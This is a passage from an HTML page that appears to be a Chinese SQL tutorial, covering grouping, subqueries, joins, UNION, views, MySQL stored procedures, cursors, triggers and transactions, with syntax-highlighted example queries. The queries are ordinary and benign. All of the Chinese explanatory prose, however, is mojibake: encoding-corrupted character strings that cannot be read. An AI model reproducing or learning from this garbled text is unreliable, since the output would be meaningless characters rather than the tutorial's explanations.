|</p><h2>åä¸‰ã€åˆ†ç»„</h2><p>æŠŠå…·æœ‰ç›¸åŒçš„æ•°æ®å€¼çš„è¡Œæ”¾åœ¨åŒä¸€ç»„ä¸­ã€‚</p><p>å¯ä»¥å¯¹åŒä¸€åˆ†ç»„æ•°æ®ä½¿ç”¨æ±‡æ€»å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚æ±‚åˆ†ç»„æ•°æ®çš„å¹³å‡å€¼ç­‰ã€‚</p><p>æŒ‡å®šçš„åˆ†ç»„å­—æ®µé™¤äº†èƒ½æŒ‰è¯¥å­—æ®µè¿›è¡Œåˆ†ç»„ï¼Œä¹Ÿä¼šè‡ªåŠ¨æŒ‰è¯¥å­—æ®µè¿›è¡Œæ’åºã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">col</span><span class=\"p\">,</span> <span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">num</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">GROUP</span> <span class=\"k\">BY</span> <span class=\"n\">col</span><span class=\"p\">;</span></code></pre></div><p>GROUP BY è‡ªåŠ¨æŒ‰åˆ†ç»„å­—æ®µè¿›è¡Œæ’åºï¼ŒORDER BY ä¹Ÿå¯ä»¥æŒ‰æ±‡æ€»å­—æ®µæ¥è¿›è¡Œæ’åºã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">col</span><span class=\"p\">,</span> <span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">num</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">GROUP</span> <span class=\"k\">BY</span> <span class=\"n\">col</span>\n<span class=\"k\">ORDER</span> <span class=\"k\">BY</span> <span class=\"n\">num</span><span class=\"p\">;</span></code></pre></div><p>WHERE è¿‡æ»¤è¡Œï¼ŒHAVING è¿‡æ»¤åˆ†ç»„ï¼Œè¡Œè¿‡æ»¤åº”å½“å…ˆäºåˆ†ç»„è¿‡æ»¤ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">col</span><span class=\"p\">,</span> <span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">num</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col</span> <span class=\"o\">&gt;</span> <span class=\"mi\">2</span>\n<span class=\"k\">GROUP</span> <span class=\"k\">BY</span> <span class=\"n\">col</span>\n<span class=\"k\">HAVING</span> <span class=\"n\">num</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">2</span><span class=\"p\">;</span></code></pre></div><p>åˆ†ç»„è§„å®šï¼š</p><ul><li>GROUP BY å­å¥å‡ºç°åœ¨ WHERE å­å¥ä¹‹åï¼ŒORDER BY å­å¥ä¹‹å‰ï¼›</li><li>é™¤äº†æ±‡æ€»å­—æ®µå¤–ï¼ŒSELECT è¯­å¥ä¸­çš„æ¯ä¸€å­—æ®µéƒ½å¿…é¡»åœ¨ GROUP BY å­å¥ä¸­ç»™å‡ºï¼›</li><li>NULL çš„è¡Œä¼šå•ç‹¬åˆ†ä¸ºä¸€ç»„ï¼›</li><li>å¤§å¤šæ•° SQL å®ç°ä¸æ”¯æŒ GROUP BY åˆ—å…·æœ‰å¯å˜é•¿åº¦çš„æ•°æ®ç±»å‹ã€‚</li></ul><h2>åå››ã€å­æŸ¥è¯¢</h2><p>å­æŸ¥è¯¢ä¸­åªèƒ½è¿”å›ä¸€ä¸ªå­—æ®µçš„æ•°æ®ã€‚</p><p>å¯ä»¥å°†å­æŸ¥è¯¢çš„ç»“æœä½œä¸º WHRER è¯­å¥çš„è¿‡æ»¤æ¡ä»¶ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable1</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col1</span> <span class=\"k\">IN</span> <span class=\"p\">(</span><span class=\"k\">SELECT</span> <span class=\"n\">col2</span>\n               <span class=\"k\">FROM</span> <span class=\"n\">mytable2</span><span class=\"p\">);</span></code></pre></div><p>ä¸‹é¢çš„è¯­å¥å¯ä»¥æ£€ç´¢å‡ºå®¢æˆ·çš„è®¢å•æ•°é‡ï¼Œå­æŸ¥è¯¢è¯­å¥ä¼šå¯¹ç¬¬ä¸€ä¸ªæŸ¥è¯¢æ£€ç´¢å‡ºçš„æ¯ä¸ªå®¢æˆ·æ‰§è¡Œä¸€æ¬¡ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">cust_name</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"k\">SELECT</span> <span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span>\n                   <span class=\"k\">FROM</span> <span class=\"n\">Orders</span>\n                   <span class=\"k\">WHERE</span> <span class=\"n\">Orders</span><span class=\"p\">.</span><span class=\"n\">cust_id</span> <span class=\"o\">=</span> <span class=\"n\">Customers</span><span class=\"p\">.</span><span class=\"n\">cust_id</span><span class=\"p\">)</span>\n                   <span class=\"k\">AS</span> <span class=\"n\">orders_num</span>\n<span class=\"k\">FROM</span> <span class=\"n\">Customers</span>\n<span class=\"k\">ORDER</span> <span class=\"k\">BY</span> <span class=\"n\">cust_name</span><span class=\"p\">;</span></code></pre></div><h2>åäº”ã€è¿æ¥</h2><p>è¿æ¥ç”¨äºè¿æ¥å¤šä¸ªè¡¨ï¼Œä½¿ç”¨ JOIN å…³é”®å­—ï¼Œå¹¶ä¸”æ¡ä»¶è¯­å¥ä½¿ç”¨ ON è€Œä¸æ˜¯ WHEREã€‚</p><p>è¿æ¥å¯ä»¥æ›¿æ¢å­æŸ¥è¯¢ï¼Œå¹¶ä¸”æ¯”å­æŸ¥è¯¢çš„æ•ˆç‡ä¸€èˆ¬ä¼šæ›´å¿«ã€‚</p><p>å¯ä»¥ç”¨ AS ç»™åˆ—åã€è®¡ç®—å­—æ®µå’Œè¡¨åå–åˆ«åï¼Œç»™è¡¨åå–åˆ«åæ˜¯ä¸ºäº†ç®€åŒ– SQL è¯­å¥ä»¥åŠè¿æ¥ç›¸åŒè¡¨ã€‚</p><h2>å†…è¿æ¥</h2><p>å†…è¿æ¥åˆç§°ç­‰å€¼è¿æ¥ï¼Œä½¿ç”¨ INNER JOIN å…³é”®å­—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">A</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"n\">B</span><span class=\"p\">.</span><span class=\"n\">value</span>\n<span class=\"k\">FROM</span> <span class=\"n\">tablea</span> <span class=\"k\">AS</span> <span class=\"n\">A</span> <span class=\"k\">INNER</span> <span class=\"k\">JOIN</span> <span class=\"n\">tableb</span> <span class=\"k\">AS</span> <span class=\"n\">B</span>\n<span class=\"k\">ON</span> <span class=\"n\">A</span><span class=\"p\">.</span><span class=\"k\">key</span> <span class=\"o\">=</span> <span class=\"n\">B</span><span class=\"p\">.</span><span class=\"k\">key</span><span class=\"p\">;</span></code></pre></div><p>å¯ä»¥ä¸æ˜ç¡®ä½¿ç”¨ INNER JOINï¼Œè€Œä½¿ç”¨æ™®é€šæŸ¥è¯¢å¹¶åœ¨ WHERE ä¸­å°†ä¸¤ä¸ªè¡¨ä¸­è¦è¿æ¥çš„åˆ—ç”¨ç­‰å€¼æ–¹æ³•è¿æ¥èµ·æ¥ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">A</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"n\">B</span><span class=\"p\">.</span><span class=\"n\">value</span>\n<span class=\"k\">FROM</span> <span class=\"n\">tablea</span> <span class=\"k\">AS</span> <span class=\"n\">A</span><span class=\"p\">,</span> <span class=\"n\">tableb</span> <span class=\"k\">AS</span> <span class=\"n\">B</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">A</span><span class=\"p\">.</span><span class=\"k\">key</span> <span class=\"o\">=</span> <span class=\"n\">B</span><span class=\"p\">.</span><span class=\"k\">key</span><span class=\"p\">;</span></code></pre></div><h2>è‡ªè¿æ¥</h2><p>è‡ªè¿æ¥å¯ä»¥çœ‹æˆå†…è¿æ¥çš„ä¸€ç§ï¼Œåªæ˜¯è¿æ¥çš„è¡¨æ˜¯è‡ªèº«è€Œå·²ã€‚</p><p>ä¸€å¼ å‘˜å·¥è¡¨ï¼ŒåŒ…å«å‘˜å·¥å§“åå’Œå‘˜å·¥æ‰€å±éƒ¨é—¨ï¼Œè¦æ‰¾å‡ºä¸ Jim å¤„åœ¨åŒä¸€éƒ¨é—¨çš„æ‰€æœ‰å‘˜å·¥å§“åã€‚</p><p>å­æŸ¥è¯¢ç‰ˆæœ¬</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">name</span>\n<span class=\"k\">FROM</span> <span class=\"n\">employee</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">department</span> <span class=\"o\">=</span> <span class=\"p\">(</span>\n      <span class=\"k\">SELECT</span> <span class=\"n\">department</span>\n      <span class=\"k\">FROM</span> <span class=\"n\">employee</span>\n      <span class=\"k\">WHERE</span> <span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;Jim&#34;</span><span class=\"p\">);</span></code></pre></div><p>è‡ªè¿æ¥ç‰ˆæœ¬</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">e1</span><span class=\"p\">.</span><span class=\"n\">name</span>\n<span class=\"k\">FROM</span> <span class=\"n\">employee</span> <span class=\"k\">AS</span> <span class=\"n\">e1</span> <span class=\"k\">INNER</span> <span class=\"k\">JOIN</span> <span class=\"n\">employee</span> <span class=\"k\">AS</span> <span class=\"n\">e2</span>\n<span class=\"k\">ON</span> <span class=\"n\">e1</span><span class=\"p\">.</span><span class=\"n\">department</span> <span class=\"o\">=</span> <span class=\"n\">e2</span><span class=\"p\">.</span><span class=\"n\">department</span>\n      <span class=\"k\">AND</span> <span class=\"n\">e2</span><span class=\"p\">.</span><span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;Jim&#34;</span><span class=\"p\">;</span></code></pre></div><h2>è‡ªç„¶è¿æ¥</h2><p>è‡ªç„¶è¿æ¥æ˜¯æŠŠåŒååˆ—é€šè¿‡ç­‰å€¼æµ‹è¯•è¿æ¥èµ·æ¥çš„ï¼ŒåŒååˆ—å¯ä»¥æœ‰å¤šä¸ªã€‚</p><p>å†…è¿æ¥å’Œè‡ªç„¶è¿æ¥çš„åŒºåˆ«ï¼šå†…è¿æ¥æä¾›è¿æ¥çš„åˆ—ï¼Œè€Œè‡ªç„¶è¿æ¥è‡ªåŠ¨è¿æ¥æ‰€æœ‰åŒååˆ—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">A</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">,</span> <span class=\"n\">B</span><span class=\"p\">.</span><span class=\"n\">value</span>\n<span class=\"k\">FROM</span> <span class=\"n\">tablea</span> <span class=\"k\">AS</span> <span class=\"n\">A</span> <span class=\"k\">NATURAL</span> <span class=\"k\">JOIN</span> <span class=\"n\">tableb</span> <span class=\"k\">AS</span> <span class=\"n\">B</span><span class=\"p\">;</span></code></pre></div><h2>å¤–è¿æ¥</h2><p>å¤–è¿æ¥ä¿ç•™äº†æ²¡æœ‰å…³è”çš„é‚£äº›è¡Œã€‚åˆ†ä¸ºå·¦å¤–è¿æ¥ï¼Œå³å¤–è¿æ¥ä»¥åŠå…¨å¤–è¿æ¥ï¼Œå·¦å¤–è¿æ¥å°±æ˜¯ä¿ç•™å·¦è¡¨æ²¡æœ‰å…³è”çš„è¡Œã€‚</p><p>æ£€ç´¢æ‰€æœ‰é¡¾å®¢çš„è®¢å•ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿˜æ²¡æœ‰è®¢å•ä¿¡æ¯çš„é¡¾å®¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">Customers</span><span class=\"p\">.</span><span class=\"n\">cust_id</span><span class=\"p\">,</span> <span class=\"n\">Orders</span><span class=\"p\">.</span><span class=\"n\">order_num</span>\n<span class=\"k\">FROM</span> <span class=\"n\">Customers</span> <span class=\"k\">LEFT</span> <span class=\"k\">OUTER</span> <span class=\"k\">JOIN</span> <span class=\"n\">Orders</span>\n<span class=\"k\">ON</span> <span class=\"n\">Customers</span><span class=\"p\">.</span><span class=\"n\">cust_id</span> <span class=\"o\">=</span> <span class=\"n\">Orders</span><span class=\"p\">.</span><span class=\"n\">cust_id</span><span class=\"p\">;</span></code></pre></div><p>customers è¡¨ï¼š</p><p>| cust_id | cust_name | | :---: | :---: | | 1 | a | | 2 | b | | 3 | c |</p><p>orders è¡¨ï¼š</p><p>| order_id | cust_id | | :---: | :---: | |1    | 1 | |2    | 1 | |3    | 3 | |4    | 3 |</p><p>ç»“æœï¼š</p><p>| cust_id | cust_name | order_id | | :---: | :---: | :---: | | 1 | a | 1 | | 1 | a | 2 | | 3 | c | 3 | | 3 | c | 4 | | 2 | b | Null |</p><h2>åå…­ã€ç»„åˆæŸ¥è¯¢</h2><p>ä½¿ç”¨  <b>UNION</b>  æ¥ç»„åˆä¸¤ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæŸ¥è¯¢è¿”å› M è¡Œï¼Œç¬¬äºŒä¸ªæŸ¥è¯¢è¿”å› N è¡Œï¼Œé‚£ä¹ˆç»„åˆæŸ¥è¯¢çš„ç»“æœä¸€èˆ¬ä¸º M+N è¡Œã€‚</p><p>æ¯ä¸ªæŸ¥è¯¢å¿…é¡»åŒ…å«ç›¸åŒçš„åˆ—ã€è¡¨è¾¾å¼å’Œèšé›†å‡½æ•°ã€‚</p><p>é»˜è®¤ä¼šå»é™¤ç›¸åŒè¡Œï¼Œå¦‚æœéœ€è¦ä¿ç•™ç›¸åŒè¡Œï¼Œä½¿ç”¨ UNION ALLã€‚</p><p>åªèƒ½åŒ…å«ä¸€ä¸ª ORDER BY å­å¥ï¼Œå¹¶ä¸”å¿…é¡»ä½äºè¯­å¥çš„æœ€åã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">col</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col</span> <span class=\"o\">=</span> <span class=\"mi\">1</span>\n<span class=\"k\">UNION</span>\n<span class=\"k\">SELECT</span> <span class=\"n\">col</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col</span> <span class=\"o\">=</span><span class=\"mi\">2</span><span class=\"p\">;</span></code></pre></div><h2>åä¸ƒã€è§†å›¾</h2><p>è§†å›¾æ˜¯è™šæ‹Ÿçš„è¡¨ï¼Œæœ¬èº«ä¸åŒ…å«æ•°æ®ï¼Œä¹Ÿå°±ä¸èƒ½å¯¹å…¶è¿›è¡Œç´¢å¼•æ“ä½œã€‚</p><p>å¯¹è§†å›¾çš„æ“ä½œå’Œå¯¹æ™®é€šè¡¨çš„æ“ä½œä¸€æ ·ã€‚</p><p>è§†å›¾å…·æœ‰å¦‚ä¸‹å¥½å¤„ï¼š</p><ul><li>ç®€åŒ–å¤æ‚çš„ SQL æ“ä½œï¼Œæ¯”å¦‚å¤æ‚çš„è¿æ¥ï¼›</li><li>åªä½¿ç”¨å®é™…è¡¨çš„ä¸€éƒ¨åˆ†æ•°æ®ï¼›</li><li>é€šè¿‡åªç»™ç”¨æˆ·è®¿é—®è§†å›¾çš„æƒé™ï¼Œä¿è¯æ•°æ®çš„å®‰å…¨æ€§ï¼›</li><li>æ›´æ”¹æ•°æ®æ ¼å¼å’Œè¡¨ç¤ºã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">VIEW</span> <span class=\"n\">myview</span> <span class=\"k\">AS</span>\n<span class=\"k\">SELECT</span> <span class=\"n\">Concat</span><span class=\"p\">(</span><span class=\"n\">col1</span><span class=\"p\">,</span> <span class=\"n\">col2</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">concat_col</span><span class=\"p\">,</span> <span class=\"n\">col3</span><span class=\"o\">*</span><span class=\"n\">col4</span> <span class=\"k\">AS</span> <span class=\"n\">compute_col</span>\n<span class=\"k\">FROM</span> <span class=\"n\">mytable</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">col5</span> <span class=\"o\">=</span> <span class=\"n\">val</span><span class=\"p\">;</span></code></pre></div><h2>åå…«ã€å­˜å‚¨è¿‡ç¨‹</h2><p>å­˜å‚¨è¿‡ç¨‹å¯ä»¥çœ‹æˆæ˜¯å¯¹ä¸€ç³»åˆ— SQL æ“ä½œçš„æ‰¹å¤„ç†ã€‚</p><p>ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹çš„å¥½å¤„ï¼š</p><ul><li>ä»£ç å°è£…ï¼Œä¿è¯äº†ä¸€å®šçš„å®‰å…¨æ€§ï¼›</li><li>ä»£ç å¤ç”¨ï¼›</li><li>ç”±äºæ˜¯é¢„å…ˆç¼–è¯‘ï¼Œå› æ­¤å…·æœ‰å¾ˆé«˜çš„æ€§èƒ½ã€‚</li></ul><p>å‘½ä»¤è¡Œä¸­åˆ›å»ºå­˜å‚¨è¿‡ç¨‹éœ€è¦è‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œå› ä¸ºå‘½ä»¤è¡Œæ˜¯ä»¥ ; ä¸ºç»“æŸç¬¦ï¼Œè€Œå­˜å‚¨è¿‡ç¨‹ä¸­ä¹ŸåŒ…å«äº†åˆ†å·ï¼Œå› æ­¤ä¼šé”™è¯¯æŠŠè¿™éƒ¨åˆ†åˆ†å·å½“æˆæ˜¯ç»“æŸç¬¦ï¼Œé€ æˆè¯­æ³•é”™è¯¯ã€‚</p><p>åŒ…å« inã€out å’Œ inout ä¸‰ç§å‚æ•°ã€‚</p><p>ç»™å˜é‡èµ‹å€¼éƒ½éœ€è¦ç”¨ select into è¯­å¥ã€‚</p><p>æ¯æ¬¡åªèƒ½ç»™ä¸€ä¸ªå˜é‡èµ‹å€¼ï¼Œä¸æ”¯æŒé›†åˆçš„æ“ä½œã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">delimiter</span> <span class=\"o\">//</span>\n\n<span class=\"k\">create</span> <span class=\"k\">procedure</span> <span class=\"n\">myprocedure</span><span class=\"p\">(</span> <span class=\"k\">out</span> <span class=\"n\">ret</span> <span class=\"nb\">int</span> <span class=\"p\">)</span>\n    <span class=\"k\">begin</span>\n        <span class=\"k\">declare</span> <span class=\"n\">y</span> <span class=\"nb\">int</span><span class=\"p\">;</span>\n        <span class=\"k\">select</span> <span class=\"k\">sum</span><span class=\"p\">(</span><span class=\"n\">col1</span><span class=\"p\">)</span>\n        <span class=\"k\">from</span> <span class=\"n\">mytable</span>\n        <span class=\"k\">into</span> <span class=\"n\">y</span><span class=\"p\">;</span>\n        <span class=\"k\">select</span> <span class=\"n\">y</span><span class=\"o\">*</span><span class=\"n\">y</span> <span class=\"k\">into</span> <span class=\"n\">ret</span><span class=\"p\">;</span>\n    <span class=\"k\">end</span> <span class=\"o\">//</span>\n\n<span class=\"k\">delimiter</span> <span class=\"p\">;</span>\n<span class=\"k\">call</span> <span class=\"n\">myprocedure</span><span class=\"p\">(</span><span class=\"o\">@</span><span class=\"n\">ret</span><span class=\"p\">);</span>\n<span class=\"k\">select</span> <span class=\"o\">@</span><span class=\"n\">ret</span><span class=\"p\">;</span></code></pre></div><h2>åä¹ã€æ¸¸æ ‡</h2><p>åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨æ¸¸æ ‡å¯ä»¥å¯¹ä¸€ä¸ªç»“æœé›†è¿›è¡Œç§»åŠ¨éå†ã€‚</p><p>æ¸¸æ ‡ä¸»è¦ç”¨äºäº¤äº’å¼åº”ç”¨ï¼Œå…¶ä¸­ç”¨æˆ·éœ€è¦å¯¹æ•°æ®é›†ä¸­çš„ä»»æ„è¡Œè¿›è¡Œæµè§ˆå’Œä¿®æ”¹ã€‚</p><p>ä½¿ç”¨æ¸¸æ ‡çš„å››ä¸ªæ­¥éª¤ï¼š</p><ol><li>å£°æ˜æ¸¸æ ‡ï¼Œè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰å®é™…æ£€ç´¢å‡ºæ•°æ®ï¼›</li><li>æ‰“å¼€æ¸¸æ ‡ï¼›</li><li>å–å‡ºæ•°æ®ï¼›</li><li>å…³é—­æ¸¸æ ‡ï¼›</li></ol><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">delimiter</span> <span class=\"o\">//</span>\n<span class=\"k\">create</span> <span class=\"k\">procedure</span> <span class=\"n\">myprocedure</span><span class=\"p\">(</span><span class=\"k\">out</span> <span class=\"n\">ret</span> <span class=\"nb\">int</span><span class=\"p\">)</span>\n    <span class=\"k\">begin</span>\n        <span class=\"k\">declare</span> <span class=\"n\">done</span> <span class=\"nb\">boolean</span> <span class=\"k\">default</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n        <span class=\"k\">declare</span> <span class=\"n\">mycursor</span> <span class=\"k\">cursor</span> <span class=\"k\">for</span>\n        <span class=\"k\">select</span> <span class=\"n\">col1</span> <span class=\"k\">from</span> <span class=\"n\">mytable</span><span class=\"p\">;</span>\n        <span class=\"o\">#</span> <span class=\"err\">å®šä¹‰äº†ä¸€ä¸ª</span> <span class=\"k\">continue</span> <span class=\"k\">handler</span><span class=\"err\">ï¼Œå½“</span> <span class=\"k\">sqlstate</span> <span class=\"s1\">&#39;02000&#39;</span> <span class=\"err\">è¿™ä¸ªæ¡ä»¶å‡ºç°æ—¶ï¼Œä¼šæ‰§è¡Œ</span> <span class=\"k\">set</span> <span class=\"n\">done</span> <span class=\"o\">=</span> <span class=\"mi\">1</span>\n        <span class=\"k\">declare</span> <span class=\"k\">continue</span> <span class=\"k\">handler</span> <span class=\"k\">for</span> <span class=\"k\">sqlstate</span> <span class=\"s1\">&#39;02000&#39;</span> <span class=\"k\">set</span> <span class=\"n\">done</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n\n        <span class=\"k\">open</span> <span class=\"n\">mycursor</span><span class=\"p\">;</span>\n\n        <span class=\"n\">repeat</span>\n            <span class=\"k\">fetch</span> <span class=\"n\">mycursor</span> <span class=\"k\">into</span> <span class=\"n\">ret</span><span class=\"p\">;</span>\n            <span class=\"k\">select</span> <span class=\"n\">ret</span><span class=\"p\">;</span>\n        <span class=\"k\">until</span> <span class=\"n\">done</span> <span class=\"k\">end</span> <span class=\"n\">repeat</span><span class=\"p\">;</span>\n\n        <span class=\"k\">close</span> <span class=\"n\">mycursor</span><span class=\"p\">;</span>\n    <span class=\"k\">end</span> <span class=\"o\">//</span>\n <span class=\"k\">delimiter</span> <span class=\"p\">;</span></code></pre></div><h2>äºŒåã€è§¦å‘å™¨</h2><p>è§¦å‘å™¨ä¼šåœ¨æŸä¸ªè¡¨æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶è€Œè‡ªåŠ¨æ‰§è¡Œï¼šDELETEã€INSERTã€UPDATEã€‚</p><p>è§¦å‘å™¨å¿…é¡»æŒ‡å®šåœ¨è¯­å¥æ‰§è¡Œä¹‹å‰è¿˜æ˜¯ä¹‹åè‡ªåŠ¨æ‰§è¡Œï¼Œä¹‹å‰æ‰§è¡Œä½¿ç”¨ BEFORE å…³é”®å­—ï¼Œä¹‹åæ‰§è¡Œä½¿ç”¨ AFTER å…³é”®å­—ã€‚BEFORE ç”¨äºæ•°æ®éªŒè¯å’Œå‡€åŒ–ï¼ŒAFTER ç”¨äºå®¡è®¡è·Ÿè¸ªï¼Œå°†ä¿®æ”¹è®°å½•åˆ°å¦å¤–ä¸€å¼ è¡¨ä¸­ã€‚</p><p>INSERT è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º NEW çš„è™šæ‹Ÿè¡¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">CREATE</span> <span class=\"k\">TRIGGER</span> <span class=\"n\">mytrigger</span> <span class=\"k\">AFTER</span> <span class=\"k\">INSERT</span> <span class=\"k\">ON</span> <span class=\"n\">mytable</span>\n<span class=\"k\">FOR</span> <span class=\"k\">EACH</span> <span class=\"k\">ROW</span> <span class=\"k\">SELECT</span> <span class=\"k\">NEW</span><span class=\"p\">.</span><span class=\"n\">col</span> <span class=\"k\">into</span> <span class=\"o\">@</span><span class=\"k\">result</span><span class=\"p\">;</span>\n\n<span class=\"k\">SELECT</span> <span class=\"o\">@</span><span class=\"k\">result</span><span class=\"p\">;</span> <span class=\"c1\">-- è·å–ç»“æœ</span></code></pre></div><p>DELETE è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º OLD çš„è™šæ‹Ÿè¡¨ï¼Œå¹¶ä¸”æ˜¯åªè¯»çš„ã€‚</p><p>UPDATE è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º NEW å’Œä¸€ä¸ªåä¸º OLD çš„è™šæ‹Ÿè¡¨ï¼Œå…¶ä¸­ NEW æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ï¼Œè€Œ OLD æ˜¯åªè¯»çš„ã€‚</p><p>MySQL ä¸å…è®¸åœ¨è§¦å‘å™¨ä¸­ä½¿ç”¨ CALL è¯­å¥ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ã€‚</p><h2>äºŒåä¸€ã€äº‹åŠ¡ç®¡ç†</h2><p>åŸºæœ¬æœ¯è¯­ï¼š</p><ul><li>äº‹åŠ¡ï¼ˆtransactionï¼‰æŒ‡ä¸€ç»„ SQL è¯­å¥ï¼›</li><li>å›é€€ï¼ˆrollbackï¼‰æŒ‡æ’¤é”€æŒ‡å®š SQL è¯­å¥çš„è¿‡ç¨‹ï¼›</li><li>æäº¤ï¼ˆcommitï¼‰æŒ‡å°†æœªå­˜å‚¨çš„ SQL è¯­å¥ç»“æœå†™å…¥æ•°æ®åº“è¡¨ï¼›</li><li>ä¿ç•™ç‚¹ï¼ˆsavepointï¼‰æŒ‡äº‹åŠ¡å¤„ç†ä¸­è®¾ç½®çš„ä¸´æ—¶å ä½ç¬¦ï¼ˆplaceholderï¼‰ï¼Œä½ å¯ä»¥å¯¹å®ƒå‘å¸ƒå›é€€ï¼ˆä¸å›é€€æ•´ä¸ªäº‹åŠ¡å¤„ç†ä¸åŒï¼‰ã€‚</li></ul><p>ä¸èƒ½å›é€€ SELECT è¯­å¥ï¼Œå›é€€ SELECT è¯­å¥ä¹Ÿæ²¡æ„ä¹‰ï¼›ä¹Ÿä¸èƒ½å›é€€ CREATE å’Œ DROP è¯­å¥ã€‚</p><p>MySQL çš„äº‹åŠ¡æäº¤é»˜è®¤æ˜¯éšå¼æäº¤ï¼Œæ¯æ‰§è¡Œä¸€æ¡è¯­å¥å°±æŠŠè¿™æ¡è¯­å¥å½“æˆä¸€ä¸ªäº‹åŠ¡ç„¶åè¿›è¡Œæäº¤ã€‚å½“å‡ºç° START TRANSACTION è¯­å¥æ—¶ï¼Œä¼šå…³é—­éšå¼æäº¤ï¼›å½“ COMMIT æˆ– ROLLBACK è¯­å¥æ‰§è¡Œåï¼Œäº‹åŠ¡ä¼šè‡ªåŠ¨å…³é—­ï¼Œé‡æ–°æ¢å¤éšå¼æäº¤ã€‚</p><p>è®¾ç½® autocommit ä¸º 0 å¯ä»¥å–æ¶ˆè‡ªåŠ¨æäº¤ï¼›autocommit æ ‡è®°æ˜¯é’ˆå¯¹æ¯ä¸ªè¿æ¥è€Œä¸æ˜¯é’ˆå¯¹æœåŠ¡å™¨çš„ã€‚</p><p>å¦‚æœæ²¡æœ‰è®¾ç½®ä¿ç•™ç‚¹ï¼ŒROLLBACK ä¼šå›é€€åˆ° START TRANSACTION è¯­å¥å¤„ï¼›å¦‚æœè®¾ç½®äº†ä¿ç•™ç‚¹ï¼Œå¹¶ä¸”åœ¨ ROLLBACK ä¸­æŒ‡å®šè¯¥ä¿ç•™ç‚¹ï¼Œåˆ™ä¼šå›é€€åˆ°è¯¥ä¿ç•™ç‚¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">START</span> <span class=\"n\">TRANSACTION</span>\n<span class=\"o\">//</span> <span class=\"p\">...</span>\n<span class=\"n\">SAVEPOINT</span> <span class=\"n\">delete1</span>\n<span class=\"o\">//</span> <span class=\"p\">...</span>\n<span class=\"k\">ROLLBACK</span> <span class=\"k\">TO</span> <span class=\"n\">delete1</span>\n<span class=\"o\">//</span> <span class=\"p\">...</span>\n<span 